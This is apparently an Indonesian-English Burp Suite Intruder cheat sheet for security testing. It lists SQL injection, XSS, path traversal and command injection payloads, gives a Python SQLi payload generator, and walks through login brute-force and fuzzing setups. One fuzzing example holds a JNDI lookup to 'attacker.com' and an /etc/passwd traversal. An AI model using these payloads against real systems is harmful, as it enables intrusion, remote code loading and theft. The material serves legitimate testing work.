# Custom Payloads - Burp Suite

## Daftar Isi

1. [Payload Types](#payload-types)
2. [Intruder Payloads](#intruder-payloads)
3. [Common Payload Lists](#common-payload-lists)
4. [Custom Payload Generation](#custom-payload-generation)
5. [Payload Processing](#payload-processing)
6. [Use Case Examples](#use-case-examples)

---

## Payload Types

### Intruder Payload Types
| Type | Description | Use Case |
|------|-------------|----------|
| Simple List | Manual list | Brute force |
| Runtime File | Load from file | Wordlists |
| Numbers | Sequential numbers | ID enumeration |
| Dates | Date ranges | Temporal testing |
| Character Blocks | Repeated chars | Buffer overflow |
| Brute Forcer | Character combinations | Password cracking |
| Null Payloads | No changes | Timing attacks |
| Character Frobber | Character rotation | Encoding tests |

---

## Intruder Payloads

### Setup Payload
```
Intruder > Payloads
- Payload Set: 1
- Payload type: Simple list

Add payloads:
- admin
- test
- root
- administrator
```

### Number Payload
```
Payload type: Numbers
- Range: 1-1000
- Step: 1
- Format: Decimal
```

### Custom Generator
```
Payload type: Custom iterator
- Position 1: a,b,c
- Position 2: 1,2,3
- Separator: (empty)
```

---

## Common Payload Lists

### SQL Injection Payloads
```sql
'
''
';--
';夯--
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' AND 1=1--
1' AND 1=2--
admin'--
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1--
admin' or '1'='1
```

### XSS Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### Path Traversal Payloads
```
../../
..//..//
..../
....//
../
..\
..\..\
..\/..\/
%2e%2e%2f
%2e%2e/
..%252f
```

### Command Injection Payloads
```bash
;whoami
|whoami
&whoami
`whoami`
$(whoami)
\nwhoami
%0Awhoami
```

---

## Custom Payload Generation

### Python Script Generator
```python
# Generate SQLi payloads
payloads = []

# Basic quotes
payloads.extend(["'", "''", "'--", "'#"])

# Boolean conditions  
payloads.extend([
    "' OR '1'='1",
    "' OR '1'='2",
    "1' AND '1'='1",
    "1' AND '1'='2"
])

# Union based
for i in range(1, 10):
    payloads.append(f"' UNION SELECT {i}--")

# Output to file
with open('sqli_payloads.txt', 'w') as f:
    f.write('\n'.join(payloads))
```

### Character Fuzzing
```python
# Generate fuzzing payloads
fuzz_chars = ["<", ">", "'", "\"", "&", ";", "--", "/*", "*/"]

for char in fuzz_chars:
    print(char)
    print(f"\\x{ord(char):02x}")
```

---

## Payload Processing

### Payload Processing Rules
```
Intruder > Payloads > Payload Processing
- Add rule untuk modify payloads
```

### Processing Rules
| Rule | Description |
|------|-------------|
| **Encode** | URL, Base64, HTML |
| **Decode** | Reverse encoding |
| **Hash** | MD5, SHA1, SHA256 |
| **Case** | Lowercase, Uppercase |
| **Regex** | Find and replace |
| **Skip** | Conditional skip |

### Example Rules
```
# Add prefix:
Admin#

# Add suffix:
;

# Encode URL:
%20, %27, %3D

# Hash MD5:
32-char hash output
```

---

## Use Case Examples

### 1. Username Enumeration
```
POST /login
username=§admin§&password=***

Payloads:
admin
root
test
administrator
support
```

### 2. Parameter Fuzzing
```
GET /search?q=§test§

Payloads:
test
<svg onload=alert(1)>
../../../../etc/passwd
' OR 1=1--
${jndi:ldap://attacker.com/a}
```

### 3. Authentication Bypass
```
POST /auth/login
username=admin§&password=§test§

Payload combinations:
admin:test
admin:admin
admin:123456
```

---

## Wordlist Resources

### Opensource Wordlists
```
# Common locations:
/usr/share/wordlists/
SecLists/
github.com/danielmiessler/SecLists
```

### Popular Wordlists
| File | Purpose |
|------|---------|
| usernames.txt | Username enumeration |
| passwords.txt | Password brute force |
| fuzzing.txt | General fuzzing |
| sqli.txt | SQL injection |
| xss.txt | XSS testing |

---

**Version**: 1.0.4-20260301-Minggu-1003-WIB  
**Author**: waktuberhenti
